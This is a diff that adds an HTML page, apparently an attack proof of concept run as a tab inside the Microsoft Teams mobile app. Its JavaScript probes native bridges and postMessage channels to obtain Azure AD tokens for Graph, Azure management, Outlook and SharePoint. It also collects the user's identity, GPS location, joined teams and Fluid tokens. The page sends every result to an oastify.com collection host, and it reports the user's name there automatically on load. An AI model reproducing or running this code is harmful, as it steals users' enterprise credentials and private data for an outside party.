@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Source Escalation</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:55vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#f85149; font-size:11px; }
+  button { background:#21262d; color:#f85149; border:1px solid #f85149; padding:6px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:10px; font-weight:bold; }
+  button.g { color:#3fb950; border-color:#3fb950; }
+  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(160px, 1fr)); gap:3px; margin:3px 0; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>TEST 22 — SOURCE CODE ESCALATION VECTORS</b></div>
+
+<div class="section"><b>A — window.external.getAadToken (meetingOptions.js)</b></div>
+<div class="grid">
+  <button class="g" onclick="probeWindowExternal()">PROBE window.external</button>
+  <button class="g" onclick="getAadTokenGraph()">GET TOKEN (Graph)</button>
+  <button class="g" onclick="getAadTokenAll()">GET TOKEN (all resources)</button>
+  <button class="g" onclick="getAadCurrentUser()">GET AAD USER</button>
+</div>
+
+<div class="section"><b>B — nestedAppAuthBridge (NestedAppAuth.js)</b></div>
+<div class="grid">
+  <button class="g" onclick="probeNestedAuth()">PROBE nestedAppAuth</button>
+  <button class="g" onclick="nestedAuthRequest()">REQUEST NAA TOKEN</button>
+</div>
+
+<div class="section"><b>C — PowerLiftHost.invokeCapability</b></div>
+<div class="grid">
+  <button class="g" onclick="probePowerLift()">PROBE PowerLiftHost</button>
+  <button class="g" onclick="powerLiftCapabilities()">INVOKE CAPABILITIES</button>
+</div>
+
+<div class="section"><b>D — webkit.messageHandlers direct access</b></div>
+<div class="grid">
+  <button class="g" onclick="probeAllHandlers()">PROBE ALL HANDLERS</button>
+  <button class="g" onclick="directGetAadToken()">DIRECT getAadToken</button>
+  <button class="g" onclick="directQnAToken()">DIRECT QnA Token</button>
+  <button class="g" onclick="directYammerToken()">DIRECT Yammer Token</button>
+</div>
+
+<div class="section"><b>E — Video frame protocol + custom schemes</b></div>
+<div class="grid">
+  <button class="g" onclick="probeVideoFrame()">PROBE video-frame://</button>
+  <button class="g" onclick="probeCopilotScheme()">PROBE copilot-agents://</button>
+</div>
+
+<div class="section"><b>F — STM Token via postMessage (meetingOptionsSTM.js)</b></div>
+<div class="grid">
+  <button class="g" onclick="stmTokenRequest()">STM getAadToken</button>
+  <button class="g" onclick="stmUserRequest()">STM getAadCurrentUser</button>
+</div>
+
+<div class="section"><b>G — Information Disclosure APIs</b></div>
+<div class="grid">
+  <button class="g" onclick="getUserJoinedTeams()">GET ALL TEAMS</button>
+  <button class="g" onclick="getLocation()">GET GPS</button>
+  <button class="g" onclick="getFluidTenantInfo()">FLUID TENANT INFO</button>
+  <button class="g" onclick="getFluidToken()">FLUID TOKEN</button>
+</div>
+
+<div>
+  <button onclick="copyOut()">COPY</button>
+  <button onclick="el.textContent=''">CLEAR</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var C = 'lynw9f4aclssunythk5jzsymkdq4ex2m.oastify.com';
+var NI = null;
+var origFPM = null;
+var msgId = 4000;
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+function bridgeSend(func, args) {
+  var id = msgId++;
+  var request = { id: id, func: func, args: args || [], timestamp: Date.now(), apiVersionTag: 'v2_' + func };
+  if (NI && NI.framelessPostMessage) {
+    try { NI.framelessPostMessage(JSON.stringify(request)); return id; }
+    catch(e) { log('bridgeSend: ' + e.message, 'fail'); }
+  }
+  return null;
+}
+
+// Hook NI
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+  origFPM = NI.framelessPostMessage;
+  log('NI captured (' + Object.getOwnPropertyNames(NI).length + ' props)', 'ok');
+}
+
+
+// ================================================================
+// A: window.external.getAadToken
+//
+// meetingOptions.js exposes window.external = { getAadToken, getAadCurrentUser }
+// If these exist in the tab context, attacker can request AAD tokens
+// for ANY resource (Graph, SharePoint, etc.)
+// ================================================================
+
+function probeWindowExternal() {
+  log('\n=== PROBE window.external ===', 'crit');
+
+  log('window.external: ' + typeof window.external, typeof window.external === 'object' ? 'crit' : 'warn');
+  if (window.external) {
+    var keys = [];
+    try { keys = Object.keys(window.external); } catch(e) {}
+    log('  keys: ' + (keys.length > 0 ? keys.join(', ') : '(none or not enumerable)'), keys.length > 0 ? 'crit' : 'info');
+
+    var check = ['getAadToken', 'getAadCurrentUser', 'getSTMAADToken', 'getSTMCurrentUser'];
+    for (var i = 0; i < check.length; i++) {
+      try {
+        var t = typeof window.external[check[i]];
+        log('  window.external.' + check[i] + ': ' + t, t === 'function' ? 'crit' : 'info');
+        if (t === 'function') {
+          ex('t22-external-found', { func: check[i], type: t });
+        }
+      } catch(e) {
+        log('  window.external.' + check[i] + ': error — ' + e.message, 'fail');
+      }
+    }
+  }
+
+  // Also check if global functions exist (meetingOptionsSTM.js puts them globally)
+  var globals = ['getSTMAADToken', 'getSTMCurrentUser', 'handleAadCurrentUser', 'handleAadGetToken'];
+  for (var i = 0; i < globals.length; i++) {
+    if (typeof window[globals[i]] === 'function') {
+      log('  window.' + globals[i] + ' EXISTS!', 'crit');
+      ex('t22-global-found', { func: globals[i] });
+    }
+  }
+
+  ex('t22-probe-external', { exists: !!window.external, type: typeof window.external });
+}
+
+function getAadTokenGraph() {
+  log('\n=== window.external.getAadToken — Graph resource ===', 'crit');
+
+  if (window.external && typeof window.external.getAadToken === 'function') {
+    log('Calling getAadToken for Graph...', 'warn');
+    try {
+      window.external.getAadToken(
+        function(token) {
+          log('\n!!! AAD TOKEN RECEIVED !!!', 'crit');
+          log('Token: ' + String(token).substring(0, 200), 'crit');
+          ex('t22-AAD-TOKEN-GRAPH', { token: String(token).substring(0, 500) });
+        },
+        function(err) {
+          log('Error: ' + err, 'fail');
+          ex('t22-aad-token-err', { error: String(err) });
+        },
+        'https://graph.microsoft.com',
+        null
+      );
+    } catch(e) {
+      log('Call error: ' + e.message, 'fail');
+    }
+  } else {
+    log('window.external.getAadToken not available', 'warn');
+    log('Trying via webkit.messageHandlers.listener directly...', 'info');
+    directGetAadToken();
+  }
+}
+
+function getAadTokenAll() {
+  log('\n=== getAadToken — ALL RESOURCES ===', 'crit');
+
+  var resources = [
+    'https://graph.microsoft.com',
+    'https://management.azure.com',
+    'https://outlook.office365.com',
+    'https://api.spaces.skype.com',
+    'https://chatsvcagg.teams.microsoft.com',
+    'https://*.sharepoint.com',
+    'https://substrate.office.com'
+  ];
+
+  if (window.external && typeof window.external.getAadToken === 'function') {
+    resources.forEach(function(res) {
+      try {
+        window.external.getAadToken(
+          function(token) {
+            log('TOKEN for ' + res + ': ' + String(token).substring(0, 100), 'crit');
+            ex('t22-AAD-TOKEN-' + res.replace(/[^a-z]/gi, ''), { resource: res, token: String(token).substring(0, 500) });
+          },
+          function(err) { log(res + ' → ' + err, 'fail'); },
+          res, null
+        );
+      } catch(e) {
+        log(res + ' → ' + e.message, 'fail');
+      }
+    });
+  } else {
+    log('Not available. Trying direct webkit approach...', 'warn');
+    resources.forEach(function(res, i) {
+      try {
+        window.webkit.messageHandlers.listener.postMessage({
+          event: 'getAadToken',
+          requestId: 9000 + i,
+          resource: res
+        });
+        log('Sent getAadToken for ' + res + ' (id=' + (9000+i) + ')', 'ok');
+        ex('t22-direct-aad-' + i, { resource: res });
+      } catch(e) {
+        log('webkit error: ' + e.message, 'fail');
+      }
+    });
+  }
+}
+
+function getAadCurrentUser() {
+  log('\n=== getAadCurrentUser ===', 'crit');
+
+  if (window.external && typeof window.external.getAadCurrentUser === 'function') {
+    window.external.getAadCurrentUser(
+      function(userInfo) {
+        log('AAD USER INFO: ' + JSON.stringify(userInfo).substring(0, 300), 'crit');
+        ex('t22-AAD-USER', { user: JSON.stringify(userInfo).substring(0, 500) });
+      },
+      function(err) { log('Error: ' + err, 'fail'); }
+    );
+  } else {
+    log('Not available via window.external', 'warn');
+    try {
+      window.webkit.messageHandlers.listener.postMessage({
+        event: 'getAadCurrentUser',
+        requestId: 9100
+      });
+      log('Sent getAadCurrentUser direct (id=9100)', 'ok');
+    } catch(e) {
+      log('webkit error: ' + e.message, 'fail');
+    }
+  }
+}
+
+
+// ================================================================
+// B: nestedAppAuthBridge
+//
+// NestedAppAuth.js exposes window.nestedAppAuthBridge globally
+// If accessible, we can request auth tokens for nested apps
+// ================================================================
+
+function probeNestedAuth() {
+  log('\n=== PROBE nestedAppAuthBridge ===', 'crit');
+
+  log('window.nestedAppAuthBridge: ' + typeof window.nestedAppAuthBridge, 'info');
+
+  if (window.nestedAppAuthBridge) {
+    var methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.nestedAppAuthBridge));
+    log('Methods: ' + methods.join(', '), 'crit');
+    log('Events registered: ' + (window.nestedAppAuthBridge.events ? window.nestedAppAuthBridge.events.length : 'N/A'), 'info');
+    ex('t22-naa-probe', { exists: true, methods: methods.join(',') });
+  } else {
+    log('Not in this context', 'warn');
+    // Check if webkit handler exists
+    try {
+      var exists = !!window.webkit.messageHandlers.nestedAppAuthBridge;
+      log('webkit.messageHandlers.nestedAppAuthBridge: ' + exists, exists ? 'crit' : 'info');
+      ex('t22-naa-webkit', { exists: exists });
+    } catch(e) {
+      log('webkit handler not found: ' + e.message, 'info');
+    }
+  }
+}
+
+function nestedAuthRequest() {
+  log('\n=== nestedAppAuthBridge — token request ===', 'crit');
+
+  // Method 1: via global bridge object
+  if (window.nestedAppAuthBridge) {
+    window.nestedAppAuthBridge.addEventListener('message', function(response) {
+      log('NAA RESPONSE: ' + JSON.stringify(response).substring(0, 300), 'crit');
+      ex('t22-NAA-RESPONSE', { response: JSON.stringify(response).substring(0, 500) });
+    });
+
+    var payload = {
+      messageType: 'NestedAppAuthRequest',
+      clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+      scope: 'https://graph.microsoft.com/.default',
+      method: 'GetToken'
+    };
+
+    try {
+      window.nestedAppAuthBridge.postMessage(payload);
+      log('NAA request sent', 'ok');
+    } catch(e) {
+      log('NAA error: ' + e.message, 'fail');
+    }
+  }
+
+  // Method 2: via webkit handler directly
+  try {
+    var result = window.webkit.messageHandlers.nestedAppAuthBridge.postMessage({
+      messageType: 'NestedAppAuthRequest',
+      clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+      scope: 'https://graph.microsoft.com/.default',
+      method: 'GetToken'
+    });
+    log('Direct webkit NAA sent', 'ok');
+    if (result && typeof result.then === 'function') {
+      result.then(function(r) {
+        log('NAA DIRECT RESPONSE: ' + JSON.stringify(r).substring(0, 300), 'crit');
+        ex('t22-NAA-DIRECT', { response: JSON.stringify(r).substring(0, 500) });
+      }).catch(function(e) {
+        log('NAA promise error: ' + e.message, 'fail');
+      });
+    }
+  } catch(e) {
+    log('webkit NAA: ' + e.message, 'fail');
+  }
+}
+
+
+// ================================================================
+// C: PowerLiftHost.invokeCapability
+//
+// Sends arbitrary capabilities to native code
+// ================================================================
+
+function probePowerLift() {
+  log('\n=== PROBE PowerLiftHost ===', 'crit');
+
+  log('window.PowerLiftHost: ' + typeof window.PowerLiftHost, 'info');
+  if (window.PowerLiftHost) {
+    log('  invokeCapability: ' + typeof window.PowerLiftHost.invokeCapability, 'crit');
+    ex('t22-powerlift', { exists: true, invoke: typeof window.PowerLiftHost.invokeCapability });
+  }
+
+  // Check for the webkit bridge handler
+  try {
+    var exists = !!window.webkit.messageHandlers.bridge;
+    log('webkit.messageHandlers.bridge: ' + exists, exists ? 'crit' : 'info');
+  } catch(e) {
+    log('webkit.messageHandlers.bridge: not found', 'info');
+  }
+}
+
+function powerLiftCapabilities() {
+  log('\n=== PowerLiftHost — invoke capabilities ===', 'crit');
+
+  var caps = [
+    { messageType: 'use_capability', capability: 'open_app_store', props: { appId: 'com.microsoft.teams' } },
+    { messageType: 'use_capability', capability: 'open_url', props: { url: 'https://' + C + '/powerlift-openurl' } },
+    { messageType: 'use_capability', capability: 'get_device_info', props: {} },
+    { messageType: 'use_capability', capability: 'get_logs', props: {} },
+    { messageType: 'use_capability', capability: 'copy_to_clipboard', props: { text: 'POWERLIFT-TEST' } },
+    { messageType: 'use_capability', capability: 'share', props: { text: 'shared from attacker tab' } }
+  ];
+
+  // Method 1: via global object
+  if (window.PowerLiftHost && typeof window.PowerLiftHost.invokeCapability === 'function') {
+    caps.forEach(function(cap, i) {
+      try {
+        window.PowerLiftHost.invokeCapability(JSON.stringify(cap));
+        log('[' + i + '] ' + cap.capability + ' → sent', 'ok');
+        ex('t22-pl-' + cap.capability, { status: 'sent' });
+      } catch(e) {
+        log('[' + i + '] ' + cap.capability + ' → ' + e.message, 'fail');
+      }
+    });
+  } else {
+    log('PowerLiftHost not in scope. Trying webkit.messageHandlers.bridge...', 'warn');
+    caps.forEach(function(cap, i) {
+      try {
+        window.webkit.messageHandlers.bridge.postMessage(cap);
+        log('[' + i + '] ' + cap.capability + ' → sent via bridge', 'ok');
+        ex('t22-pl-bridge-' + cap.capability, { status: 'sent' });
+      } catch(e) {
+        log('[' + i + '] ' + cap.capability + ' → ' + e.message, 'fail');
+      }
+    });
+  }
+}
+
+
+// ================================================================
+// D: webkit.messageHandlers — DIRECT ACCESS
+//
+// Bypass the JS bridge objects entirely and talk to native handlers
+// ================================================================
+
+function probeAllHandlers() {
+  log('\n=== PROBE ALL webkit.messageHandlers ===', 'crit');
+
+  if (!window.webkit || !window.webkit.messageHandlers) {
+    log('window.webkit.messageHandlers not available', 'fail');
+    return;
+  }
+
+  var handlers = [
+    'listener', 'callbackHandler', 'nestedAppAuthBridge',
+    'jsApiNativeBridge', 'OWLNativeBridge', 'videoapp',
+    'nativeLog', 'bridge', 'contextMenuMessageHandler',
+    'performanceMessageHandler', 'fluidBridge'
+  ];
+
+  handlers.forEach(function(h) {
+    try {
+      var exists = !!window.webkit.messageHandlers[h];
+      log('  ' + h + ': ' + (exists ? 'EXISTS' : 'no'), exists ? 'crit' : 'info');
+      if (exists) {
+        ex('t22-handler-' + h, { exists: true });
+      }
+    } catch(e) {
+      log('  ' + h + ': error — ' + e.message, 'fail');
+    }
+  });
+}
+
+function directGetAadToken() {
+  log('\n=== DIRECT webkit getAadToken ===', 'crit');
+
+  // Register a callback in NI.callbacks to receive the response
+  if (NI) {
+    var reqId = 9200;
+    NI.callbacks[reqId] = function(response) {
+      log('\n!!! DIRECT AAD TOKEN CALLBACK !!!', 'crit');
+      log('Response: ' + String(response).substring(0, 300), 'crit');
+      ex('t22-DIRECT-AAD-TOKEN', { response: String(response).substring(0, 500) });
+    };
+
+    try {
+      window.webkit.messageHandlers.listener.postMessage({
+        event: 'getAadToken',
+        requestId: reqId,
+        resource: 'https://graph.microsoft.com'
+      });
+      log('Sent getAadToken direct to webkit listener (id=' + reqId + ')', 'ok');
+      log('Callback registered in NI.callbacks[' + reqId + ']', 'info');
+    } catch(e) {
+      log('Error: ' + e.message, 'fail');
+    }
+  }
+}
+
+function directQnAToken() {
+  log('\n=== DIRECT QnA AAD Token ===', 'crit');
+
+  if (NI) {
+    var reqId = 9300;
+    NI.callbacks[reqId] = function(response) {
+      log('QnA TOKEN RESPONSE: ' + String(response).substring(0, 300), 'crit');
+      ex('t22-QNA-TOKEN', { response: String(response).substring(0, 500) });
+    };
+
+    try {
+      window.webkit.messageHandlers.listener.postMessage({
+        event: 'QnA',
+        eventData: { event: 'extensions.qna.updateAadToken' },
+        requestId: reqId
+      });
+      log('Sent QnA token request (id=' + reqId + ')', 'ok');
+    } catch(e) {
+      log('Error: ' + e.message, 'fail');
+    }
+  }
+}
+
+function directYammerToken() {
+  log('\n=== DIRECT Yammer AAD Token ===', 'crit');
+
+  if (NI) {
+    var reqId = 9400;
+    NI.callbacks[reqId] = function(response) {
+      log('YAMMER TOKEN RESPONSE: ' + String(response).substring(0, 300), 'crit');
+      ex('t22-YAMMER-TOKEN', { response: String(response).substring(0, 500) });
+    };
+
+    try {
+      window.webkit.messageHandlers.listener.postMessage({
+        event: 'Yammer',
+        eventData: { message: 'yam.embed.initialLoginFailure' },
+        requestId: reqId
+      });
+      log('Sent Yammer token request (id=' + reqId + ')', 'ok');
+    } catch(e) {
+      log('Error: ' + e.message, 'fail');
+    }
+  }
+}
+
+
+// ================================================================
+// E: Custom protocol schemes
+// ================================================================
+
+function probeVideoFrame() {
+  log('\n=== microsoft-teams-video-frame: protocol ===', 'crit');
+
+  fetch('microsoft-teams-video-frame:').then(function(res) {
+    log('Fetch status: ' + res.status, 'crit');
+    return res.arrayBuffer();
+  }).then(function(buf) {
+    log('Got ' + buf.byteLength + ' bytes of video frame data!', 'crit');
+    ex('t22-VIDEO-FRAME', { bytes: buf.byteLength });
+  }).catch(function(e) {
+    log('Fetch error: ' + e.message, 'fail');
+    ex('t22-video-frame-err', { error: e.message });
+  });
+}
+
+function probeCopilotScheme() {
+  log('\n=== copilot-agents-mobile: protocol ===', 'crit');
+
+  fetch('copilot-agents-mobile://card-renderer').then(function(res) {
+    log('Fetch status: ' + res.status, 'crit');
+    return res.text();
+  }).then(function(text) {
+    log('Got ' + text.length + ' chars: ' + text.substring(0, 200), 'crit');
+    ex('t22-COPILOT-SCHEME', { length: text.length, preview: text.substring(0, 300) });
+  }).catch(function(e) {
+    log('Fetch error: ' + e.message, 'fail');
+  });
+}
+
+
+// ================================================================
+// F: STM Token via postMessage (meetingOptionsSTM.js pattern)
+//
+// meetingOptionsSTM.js listens for postMessage with
+// channel: "multi-window-manager-channel" and eventId: "aadGetToken"
+// It then requests a token via webkit and posts it back
+// ================================================================
+
+function stmTokenRequest() {
+  log('\n=== STM getAadToken via postMessage ===', 'crit');
+
+  // Listen for the response
+  var handler = function(event) {
+    if (event.data && event.data.channel === 'multi-window-manager-channel') {
+      log('\nSTM RESPONSE RECEIVED!', 'crit');
+      log('Data: ' + JSON.stringify(event.data).substring(0, 400), 'crit');
+      if (event.data.payload && event.data.payload.token) {
+        log('\n!!! STM TOKEN CAPTURED !!!', 'crit');
+        log('Token: ' + String(event.data.payload.token).substring(0, 200), 'crit');
+        ex('t22-STM-TOKEN', { token: String(event.data.payload.token).substring(0, 500) });
+      }
+      ex('t22-stm-response', { data: JSON.stringify(event.data).substring(0, 500) });
+    }
+  };
+  window.addEventListener('message', handler);
+
+  // Send the trigger message (same format as meetingOptionsSTM.js expects)
+  var msg = {
+    channel: 'multi-window-manager-channel',
+    payload: {
+      eventId: 'aadGetToken',
+      correlationId: 'attacker-' + Date.now(),
+      payload: {
+        resource: 'https://graph.microsoft.com'
+      }
+    }
+  };
+
+  window.postMessage(msg, '*');
+  log('Sent aadGetToken via postMessage', 'ok');
+  ex('t22-stm-sent', { resource: 'graph' });
+
+  // Cleanup after 10s
+  setTimeout(function() { window.removeEventListener('message', handler); }, 10000);
+}
+
+function stmUserRequest() {
+  log('\n=== STM getAadCurrentUser via postMessage ===', 'crit');
+
+  var handler = function(event) {
+    if (event.data && event.data.payload && event.data.payload.authUser) {
+      log('\nSTM USER RESPONSE!', 'crit');
+      log('User: ' + JSON.stringify(event.data.payload.authUser).substring(0, 300), 'crit');
+      ex('t22-STM-USER', { user: JSON.stringify(event.data.payload).substring(0, 500) });
+    }
+  };
+  window.addEventListener('message', handler);
+
+  window.postMessage({
+    channel: 'multi-window-manager-channel',
+    payload: {
+      eventId: 'aadCurrentUser',
+      correlationId: 'attacker-user-' + Date.now(),
+      payload: {}
+    }
+  }, '*');
+  log('Sent aadCurrentUser via postMessage', 'ok');
+
+  setTimeout(function() { window.removeEventListener('message', handler); }, 10000);
+}
+
+
+// ================================================================
+// G: Information Disclosure APIs via bridge
+// ================================================================
+
+function getUserJoinedTeams() {
+  log('\n=== getUserJoinedTeams ===', 'crit');
+  var id = bridgeSend('getUserJoinedTeams', []);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+
+  // Also register callback
+  if (NI && id) {
+    NI.callbacks[id] = function(resp) {
+      log('TEAMS LIST: ' + String(resp).substring(0, 400), 'crit');
+      ex('t22-TEAMS-LIST', { teams: String(resp).substring(0, 500) });
+    };
+  }
+}
+
+function getLocation() {
+  log('\n=== location.getLocation ===', 'crit');
+  var id = bridgeSend('location.getLocation', [{ allowChooseLocation: false, showMap: false }]);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  if (NI && id) {
+    NI.callbacks[id] = function(resp) {
+      log('LOCATION: ' + String(resp).substring(0, 300), 'crit');
+      ex('t22-GPS-LOCATION', { location: String(resp).substring(0, 500) });
+    };
+  }
+}
+
+function getFluidTenantInfo() {
+  log('\n=== interactive.getFluidTenantInfo ===', 'crit');
+  var id = bridgeSend('interactive.getFluidTenantInfo', []);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  if (NI && id) {
+    NI.callbacks[id] = function(resp) {
+      log('FLUID TENANT: ' + String(resp).substring(0, 300), 'crit');
+      ex('t22-FLUID-TENANT', { info: String(resp).substring(0, 500) });
+    };
+  }
+}
+
+function getFluidToken() {
+  log('\n=== interactive.getFluidToken ===', 'crit');
+  var id = bridgeSend('interactive.getFluidToken', ['']);
+  log('Sent id=' + id, id ? 'ok' : 'fail');
+  if (NI && id) {
+    NI.callbacks[id] = function(resp) {
+      log('FLUID TOKEN: ' + String(resp).substring(0, 300), 'crit');
+      ex('t22-FLUID-TOKEN', { token: String(resp).substring(0, 500) });
+    };
+  }
+}
+
+
+// ================================================================
+// SDK INIT
+// ================================================================
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+  (async function() {
+    try {
+      await microsoftTeams.app.initialize();
+      var ctx = await microsoftTeams.app.getContext();
+      log('SDK OK: ' + ctx.user.userPrincipalName + ' | ' + ctx.app.host.clientType, 'ok');
+      log('NI: ' + (NI ? Object.getOwnPropertyNames(NI).length + ' props' : 'MISSING'), NI ? 'ok' : 'fail');
+
+      // Auto-probe critical surfaces
+      log('\n--- Auto-probing attack surfaces ---', 'info');
+
+      // Check window.external
+      log('window.external: ' + typeof window.external, typeof window.external === 'object' ? 'crit' : 'info');
+      if (window.external && typeof window.external.getAadToken === 'function') {
+        log('  !!! window.external.getAadToken EXISTS !!!', 'crit');
+      }
+
+      // Check nestedAppAuthBridge
+      log('nestedAppAuthBridge: ' + typeof window.nestedAppAuthBridge, typeof window.nestedAppAuthBridge === 'object' ? 'crit' : 'info');
+
+      // Check PowerLiftHost
+      log('PowerLiftHost: ' + typeof window.PowerLiftHost, typeof window.PowerLiftHost === 'object' ? 'crit' : 'info');
+
+      // Check webkit handlers
+      var wkHandlers = ['listener', 'nestedAppAuthBridge', 'jsApiNativeBridge', 'OWLNativeBridge', 'bridge', 'videoapp'];
+      wkHandlers.forEach(function(h) {
+        try {
+          if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[h]) {
+            log('webkit.' + h + ': EXISTS', 'crit');
+          }
+        } catch(e) {}
+      });
+
+      log('\nReady. Run PROBE ALL HANDLERS first.', 'ok');
+
+      ex('t22-init', {
+        user: ctx.user.userPrincipalName,
+        host: ctx.app.host.clientType,
+        external: typeof window.external,
+        externalGetAadToken: !!(window.external && window.external.getAadToken),
+        naa: typeof window.nestedAppAuthBridge,
+        powerLift: typeof window.PowerLiftHost
+      });
+    } catch(e) {
+      log('SDK init: ' + e.message, 'fail');
+    }
+  })();
+};
+document.head.appendChild(sdkScript);
+
+</script>
+</body>
+</html>
